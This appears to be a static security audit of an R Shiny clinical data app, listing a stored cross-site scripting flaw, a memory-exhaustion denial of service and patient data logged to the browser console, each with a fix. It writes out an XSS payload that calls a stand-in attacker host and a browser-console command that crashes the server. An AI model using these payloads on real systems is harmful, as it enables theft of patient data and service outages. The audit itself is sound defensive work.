🔴 Critical Issues

  - Location: R/utils_server_column_management.R:279 and R/utils_server_column_management.R:332; Vulnerability: Stored
    cross-site scripting because showNotification() renders column names and custom messages without escaping; Attack
    Scenario: An attacker (or malicious dataset pipeline) renames a column to <img src=x onerror=fetch('https://
    attacker/')> via the “Redigér kolonnenavne” modal, saving triggers the notification and the payload executes in the
    clinician’s browser with the app’s privileges, enabling theft of PHI or session takeover; Remediation: Sanitize/
    escape all notification strings (e.g. wrap in htmltools::htmlEscape() or reuse sanitize_column_name() before
    both persistence and messaging) and enforce a strict whitelist of characters for column names before storing;
    Severity Justification: The flaw allows immediate arbitrary JavaScript execution inside the authenticated session,
    jeopardising all sensitive data exposed by the app.

  🟡 High Priority Issues

  - Location: R/utils_server_server_management.R:62-134; Vulnerability: Auto-restore trust of client-
    supplied payload permits unbounded memory allocation → unauthenticated denial of service; Attack
    Scenario: From the browser console an attacker calls Shiny.setInputValue('auto_restore_data',
    list(data=list(nrows=1e7,ncols=100,values=rep(list(rep(0,1e7)),100))), priority='event'), the server attempts to
    materialise a 10M×100 matrix (~8 GB) and the R process exhausts memory, causing the entire Shiny app to crash for
    all users; Remediation: Harden auto_restore_data before reconstruction—enforce strict type/length checks, reject
    payloads exceeding conservative row/column thresholds, verify length(values) matches ncols, and short-circuit
    restoration when validation fails; Severity Justification: A single unauthenticated client can reliably terminate
    the production service, violating availability guarantees expected for clinical tooling.

  🟢 Medium Priority Issues

  - Location: inst/app/www/shiny-handlers.js:5-42; Vulnerability: Sensitive state (complete datasets + metadata) is
    dumped into the browser console; Attack Scenario: When the app autosaves or restores, the full session JSON is
    logged (console.log('Received saveAppState message:', message)), meaning PHI/PII sits in browser logs that can
    be harvested by shared workstations, support tooling, or malicious extensions; Remediation: Remove diagnostic
    console.log statements or gate them behind an explicit debug flag that is disabled in production, and consider
    redacting payloads before any client-side logging; Severity Justification: Console logging is often overlooked yet
    represents a persistent plaintext copy of regulated patient data on endpoints that may not be hardened.

  ℹ️ Informational

  - Ensure the notification hardening described above is applied consistently to helper wrappers such as
    ui_service$show_user_feedback before that API is used; auditing now avoids reintroducing XSS when new features call
    into it.

  Tests not run (static analysis only).

  Next steps: 1) Implement notification sanitisation and column-name validation, 2) Add robust bounds checking around
  auto_restore_data reconstruction, 3) Strip sensitive console logging and verify no other client scripts leak PHI
  before redeploying.
